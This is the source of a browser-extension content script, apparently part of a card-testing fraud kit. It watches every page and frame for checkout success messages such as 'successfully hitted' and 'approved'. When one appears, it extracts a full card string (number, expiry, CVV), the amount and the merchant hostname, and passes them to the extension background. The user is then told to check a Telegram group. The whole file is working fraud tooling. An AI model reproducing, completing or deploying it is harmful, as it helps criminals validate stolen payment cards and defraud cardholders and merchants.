/**
 * Nexvora Omni-Logic (v5.0 - Final)
 * Universal detection on every page and frame.
 */

(function() {
    // 1. Proof of Injection (User will see this on every page load)
    try {
        console.log('⚡ Nexvora Omni-Logic Activated.');
        // We only alert on the TOP frame to avoid many popups
        if (window.self === window.top) {
            alert("🚀 Nexvora Active!\n\n(Detection is now running on all frames)");
        }
    } catch(e) {}

    const startTime = Date.now();
    let hasNotified = false;

    /** 1-Second Heartbeat Scan */
    setInterval(() => {
        if (hasNotified) return;
        if (Date.now() - startTime < 1500) return;

        // Recursive scanner function
        const scan = (root) => {
            if (hasNotified || !root) return;

            const text = root.innerText || root.textContent || '';
            const lower = text.toLowerCase();
            
            // Look for specific success markers
            const isSuccess = ['paid successfully', 'successfully hitted', 'approved'].some(kw => lower.includes(kw));

            if (isSuccess && text.length > 5 && !lower.includes('wait') && !lower.includes('processing')) {
                hasNotified = true;
                
                // Extract Card
                const cardMatch = text.match(/\d{15,16}\|\d{2}\|\d{2,4}\|\d{3,4}/);
                const card = cardMatch ? cardMatch[0] : 'N/A';

                // Extract Amount
                const currencyRegex = /(?:[A-Z]{2,3}|[\$£€¥])\s?[\d,]+(?:\.\d{2,3})?|[\d,]+(?:\.\d{2})?\s?(?:[A-Z]{2,3}|[\$£€¥])/gi;
                const amountMatch = text.match(currencyRegex) || document.body.innerText.match(currencyRegex);
                const amount = amountMatch ? amountMatch[0].trim() : 'N/A';

                // Send to Background
                chrome.runtime.sendMessage({
                    type: 'NOTIFY_HIT',
                    data: {
                        card: card,
                        amount: amount,
                        gateway: 'Stripe Checkout',
                        status: 'Approved',
                        site_name: window.location.hostname,
                        user_chat_id: 'Unknown' // Background will try to resolve this
                    }
                });

                alert("🚀 Nexvora: HIT DETECTED!\n\nCheck your Telegram group now.");
                return;
            }

            // Scan Shadow DOM
            if (root.shadowRoot) scan(root.shadowRoot);

            // Scan Iframes (if same origin)
            if (root.tagName === 'IFRAME') {
                try { scan(root.contentDocument.body); } catch(e) {}
            }

            // Scan Children
            if (root.childNodes) {
                for (let child of root.childNodes) {
                    if (child.nodeType === 1) scan(child);
                }
            }
        };

        scan(document.body);
    }, 1000);
})();
